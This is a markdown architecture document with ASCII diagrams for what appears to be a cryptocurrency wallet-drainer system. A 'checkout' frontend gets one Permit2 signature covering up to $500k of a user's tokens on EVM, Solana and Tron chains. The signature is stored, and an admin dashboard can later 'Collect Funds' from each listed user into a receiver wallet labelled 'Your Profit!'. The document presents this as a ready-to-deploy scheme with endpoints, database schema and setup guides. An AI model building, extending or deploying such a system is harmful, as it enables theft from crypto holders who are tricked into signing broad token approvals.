# 🎨 System Architecture Diagram

## 📊 Complete System Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                         USER FRONTEND                           │
│                     (frontend/checkout.js)                      │
│                                                                 │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐        │
│  │   MetaMask   │  │   Phantom    │  │  TronLink    │        │
│  │    (EVM)     │  │   (Solana)   │  │   (Tron)     │        │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘        │
│         │                  │                  │                 │
│         └──────────────────┼──────────────────┘                │
│                            │                                    │
│                     ┌──────▼──────┐                           │
│                     │   Sign Once  │                           │
│                     │  (Authorize) │                           │
│                     └──────┬───────┘                           │
└─────────────────────────────┼───────────────────────────────────┘
                              │
                              │ POST /api/authorize/{chain}
                              │ {userAddress, tokens, signature}
                              │
┌─────────────────────────────▼───────────────────────────────────┐
│                       BACKEND API                               │
│                    (server/index.js)                            │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐ │
│  │               PostgreSQL Database                         │ │
│  │                                                           │ │
│  │  ┌─────────────────┐  ┌─────────────────┐              │ │
│  │  │ evm_authorizations│  │solana_authorizations│          │ │
│  │  ├─────────────────┤  ├─────────────────┤              │ │
│  │  │ user_address    │  │ user_address    │              │ │
│  │  │ chain_id        │  │ tokens (JSONB)  │              │ │
│  │  │ tokens (JSONB)  │  │ max_amount      │              │ │
│  │  │ signature       │  │ status          │              │ │
│  │  │ max_amount      │  │ created_at      │              │ │
│  │  │ status          │  └─────────────────┘              │ │
│  │  └─────────────────┘                                    │ │
│  │                     ┌─────────────────┐                 │ │
│  │                     │tron_authorizations│                │ │
│  │                     ├─────────────────┤                 │ │
│  │                     │ user_address    │                 │ │
│  │                     │ tokens (JSONB)  │                 │ │
│  │                     │ approval_tx     │                 │ │
│  │                     │ max_amount      │                 │ │
│  │                     └─────────────────┘                 │ │
│  └──────────────────────────────────────────────────────────┘ │
│                                                                 │
│  API Endpoints:                                                │
│  • POST /api/authorize/{chain}    → Store authorization       │
│  • GET  /api/pending/{chain}      → Get pending list          │
│  • POST /api/gas/estimate/{chain} → Calculate gas             │
│  • POST /api/execute/{chain}      → Execute transfer          │
│  • GET  /health                   → Health check              │
└─────────────────────────────┬───────────────────────────────────┘
                              │
                              │ GET /api/pending/evm
                              │ [list of authorizations]
                              │
┌─────────────────────────────▼───────────────────────────────────┐
│                     ADMIN DASHBOARD                             │
│                   (admin-ui/index.html)                         │
│                                                                 │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐                    │
│  │   EVM    │  │  Solana  │  │   Tron   │  ← Tabs            │
│  └─────┬────┘  └──────────┘  └──────────┘                    │
│        │                                                        │
│  ┌─────▼──────────────────────────────────────────────────┐   │
│  │         Pending Authorizations List                    │   │
│  ├────────────────────────────────────────────────────────┤   │
│  │ User: 0xABC...DEF    Value: $1,234   [Collect Funds]  │   │
│  │ User: 0x123...456    Value: $567     [Collect Funds]  │   │
│  │ User: 0x789...012    Value: $890     [Collect Funds]  │   │
│  └────────────────────────────────────────────────────────┘   │
│                                                                 │
│  Click "Collect Funds" → 3-Step Modal:                        │
│                                                                 │
│  ┌──────────────────────────────────────────────────────┐     │
│  │ Step 1: Choose Amount                                │     │
│  │ ─────────────────────                               │     │
│  │ User authorized: $1,234                             │     │
│  │ Take amount: [___100___] USD                        │     │
│  │ [Calculate Gas & Proceed]                           │     │
│  └──────────────────────────────────────────────────────┘     │
│           │                                                     │
│           │ POST /api/gas/estimate/evm                        │
│           │ {chainId, userAddress, requestedAmount: 100}      │
│           │                                                     │
│           ▼                                                     │
│  ┌──────────────────────────────────────────────────────┐     │
│  │ Step 2: Fund Relayer                                 │     │
│  │ ─────────────────────                               │     │
│  │ Gas Required: 0.0005 ETH (≈ $1.25)                 │     │
│  │ Send to: 0xRELAYER...ADDRESS                        │     │
│  │ [I've Sent the Gas - Continue]                      │     │
│  └──────────────────────────────────────────────────────┘     │
│           │                                                     │
│           ▼                                                     │
│  ┌──────────────────────────────────────────────────────┐     │
│  │ Step 3: Execute                                      │     │
│  │ ─────────────────────                               │     │
│  │ Taking:     $100.00                                 │     │
│  │ Gas Cost:   $1.25                                   │     │
│  │ Your Profit: $98.75                                 │     │
│  │ [💸 Execute Transfer Now]                           │     │
│  └──────────────────────────────────────────────────────┘     │
└─────────────────────────────┬───────────────────────────────────┘
                              │
                              │ POST /api/execute/evm
                              │ {userAddress, chainId, amountToTake: 100}
                              │
┌─────────────────────────────▼───────────────────────────────────┐
│                       BLOCKCHAIN                                │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐ │
│  │ Relayer Wallet (Pays Gas)                               │ │
│  │ • ethereum:  0xRelayer1...                              │ │
│  │ • base:      0xRelayer2...                              │ │
│  │ • polygon:   0xRelayer3...                              │ │
│  │ • solana:    SolRelayer...                              │ │
│  │ • tron:      TronRelayer...                             │ │
│  └──────────────────────────────────────────────────────────┘ │
│                              │                                  │
│                              │ Executes Permit2.permit()        │
│                              │ (using stored signature)         │
│                              ▼                                  │
│  ┌──────────────────────────────────────────────────────────┐ │
│  │ Permit2 Contract (0x000...BA3)                          │ │
│  │ Transfers tokens from user → receiver                   │ │
│  └──────────────────────────────────────────────────────────┘ │
│                              │                                  │
│                              ▼                                  │
│  ┌──────────────────────────────────────────────────────────┐ │
│  │ Receiver Wallet (Your Profit!)                          │ │
│  │ 0x98F63...20Cf9                                         │ │
│  │ ✅ Received: $100 USDC                                  │ │
│  └──────────────────────────────────────────────────────────┘ │
└───────────────────────────────────────────────────────────────┘
```

## 🔄 Execution Flow (Detailed)

### Phase 1: User Authorization (One-Time)
```
1. User connects wallet
   ↓
2. Frontend scans for tokens (USDC, USDT, DAI, etc.)
   ↓
3. Frontend calculates total value ($1-$500k)
   ↓
4. User signs Permit2 message (ONE signature)
   ↓
5. Frontend sends to backend API
   ↓
6. Backend stores in PostgreSQL
   ↓
7. Status = 'active', valid for 30 days
```

### Phase 2: Admin Collection (Anytime within 30 days)
```
1. Admin opens dashboard
   ↓
2. Sees list of pending authorizations
   ↓
3. Clicks "Collect Funds" on user
   ↓
4. Chooses amount ($1 to max authorized)
   ↓
5. System calculates exact gas needed
   ↓
6. Admin sends gas to relayer wallet
   ↓
7. Admin clicks "Execute Transfer"
   ↓
8. Backend reads stored signature from DB
   ↓
9. Relayer calls Permit2.permit(signature)
   ↓
10. Blockchain transfers tokens
    ↓
11. Funds arrive in receiver wallet
    ↓
12. Database updates: status = 'executed'
    ↓
13. Admin profit = amount - gas cost
```

## 💡 Key Advantages

### For Users:
✅ Sign ONCE, valid 30 days
✅ ZERO gas fees
✅ No need to be present for transfers
✅ Can authorize up to $500k

### For Admin:
✅ Choose exact amount per execution
✅ No pre-funding required
✅ Calculate gas before each transaction
✅ Maximum profit (amount - gas)

### System Benefits:
✅ PostgreSQL = No data loss
✅ Multi-chain = More users
✅ Dynamic amounts = Flexibility
✅ Just-in-time funding = Capital efficiency

## 📊 Data Flow

```
User Wallet → Frontend → Backend → PostgreSQL → Admin Dashboard
     ↓                                              ↓
     │                                         [Execute]
     │                                              ↓
     │                                    Backend reads DB
     │                                              ↓
     │                                    Relayer + Permit2
     │                                              ↓
     └──────────────────────────────────────→ Receiver Wallet
                (Tokens transferred)
```

## 🎯 Technology Stack

```
Frontend:
  • Vanilla JavaScript
  • ethers.js v6 (EVM)
  • @solana/web3.js (Solana)
  • TronWeb (Tron)

Backend:
  • Node.js + Express
  • PostgreSQL (pg)
  • ethers.js (signing)
  • @solana/web3.js
  • TronWeb

Infrastructure:
  • Database: PostgreSQL
  • Frontend: Vercel / Netlify
  • Backend: Render.com / Railway
  • Admin: Vercel (subdomain)
```

---

**Ready to implement?** Start with QUICK_START_NEW.md!

**Need details?** Read README_JIT_SYSTEM.md!

**Ready to deploy?** Follow DEPLOYMENT_CHECKLIST_NEW.md!
